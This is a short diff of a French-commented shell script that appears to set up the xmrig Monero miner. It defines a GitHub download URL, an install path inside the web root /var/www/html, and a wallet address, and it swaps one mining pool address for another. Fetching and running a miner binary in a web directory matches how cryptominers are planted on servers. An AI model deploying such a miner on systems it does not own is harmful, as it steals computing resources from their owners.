@@ -7,7 +7,7 @@ XMRIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/xm
 XMRIG_PATH="/var/www/html/xmrig"
 
 # Adresse du pool et adresse du portefeuille
-POOL_ADDRESS="pool.hashvault.pro:443"
+POOL_ADDRESS="https://moneroocean.stream/"
 WALLET_ADDRESS="48MieRSJv6BSHpoqUYF5Bv6iFkahz6tJvXX8Hw1hYscm8GZgr5vt3PBThEqxkLaTBvh9dFddDsCxMRdMBrd2TbWdFaaKjiQ"
 
 # Télécharger le binaire xmrig
